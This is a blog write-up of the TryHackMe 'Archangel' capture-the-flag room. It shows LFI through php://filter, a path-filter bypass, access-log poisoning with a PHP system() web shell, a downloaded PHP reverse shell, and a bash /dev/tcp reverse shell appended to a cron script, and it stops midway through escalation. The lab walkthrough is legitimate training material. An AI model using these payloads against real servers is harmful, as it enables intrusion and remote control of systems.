---
layout: post
title: Archangel
categories: Privesc
---
Hello guys and welcome to yet another writeup. This is ye another easy box on tryhackme and is accessible [here](https://tryhackme.com/room/archangel)
We shall tackle some awesome topics which include:
  1. LFI.
  2. Priviledge exploitation.
  3. Web exploitation.
With that said let us get right to it

# NMAP scan.
As usual we are gonna start of by scanning open ports on our machine.
![](https://i.ibb.co/ZVjYSZ9/nmap.png)

We are able to see that port 80 is open and is hosting a web application.
we are able to view a home page which does not have alot on it but we can see a type of hostname

![](https://i.ibb.co/YLJjDwK/wavefire.png)

We can actually use this and and it to our **/etc/hosts** file, then try and go to the page.
![](https://i.ibb.co/TWTBYN0/mafia.png)

# LFI.
Okay guys it is about to get really messy in here. Stay frosty.

So first of all we are going to FUZZ for hidden directories.
![](https://i.ibb.co/kQRKnYg/wfuzz.png)
And we get a hit for **robots.txt**. which when we visit the page looks something like this.
![](https://i.ibb.co/vv2SyZj/robots.png).

And we can actually see another directory **/test.php**. visit this page and we can view another page with a button.
![](https://i.ibb.co/VYM0RyP/control.png)
We can then see that the button redirects us to **?view=/var/www/html/development_testing/mrrobot.php**.

From here we can try to do a path traversal filter. After hours of trial and error I found this filter and it worked.
**php://filter/convert.base64-encode/resource=**
Okay so now we can see some base64 code 
let us try and change **mrrobot.php** to **test.php**. And we can see some more base64. let us decode that.

![](https://i.ibb.co/pnGV1tK/testbase64.png)
![](https://i.ibb.co/944fSfv/lfiflag.png)

And we can get a flag but also we can see some php filters on it.
# Acesslog
Okay so the filter dictates that using **../..** which we can easily bypasss by using **..//..**

Next let us try and view the access log using the bypass.

![](https://i.ibb.co/f98gBfQ/accesslog.png)

So next we can try and pass some malicious code to the user agent. **<?php system($_GET['cmd']); ?>**.
So to do this follow this steps.

 1. right click and press Inspect on the dropdown menu.
 2. click on the Network option and reload the page
 3. Hit resend.
 4. scroll to the user agent and replace with the malicious code.
 5. Hit send.

Smooth so next up let us try and execute some commands on it.
let us try and add **&cmd=ls** to the end of the url.

![](https://i.ibb.co/WWmnG2H/cmd-ls.png)

We can actually run commands on it. so next let us try and get a reverse shell.

# SHELL
So we are going to get a sample php reverseshell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
Next we are going to set up a python server on our machine. 
Next we are going to run **&cmd=wget http://ip/revshell.php**
We should be able to get a 200 code on our machin e.
![](https://i.ibb.co/4jKLJfz/httpserver.png)

next start up a listener on your machine
Then run **&cmd=php revshell.php**
going back to our listener we have a shell.

![](https://i.ibb.co/gzQvS34/nc.png)


# Switch user.

So next we can get a better shell by using **python3 -c "import pty;pty.spawn('/bin/bash -i')"**

Then we can check out the cron jobs **cat /etc/crontab**

We can actually see that a job runs as archangel every minute. Which we can read and write.
So we then run **echo "bash -i >& /dev/tcp/ip/1235 0>&1" >> /opt/helloworld.sh**

Then run another listener and wait for a minute. Coffee break.



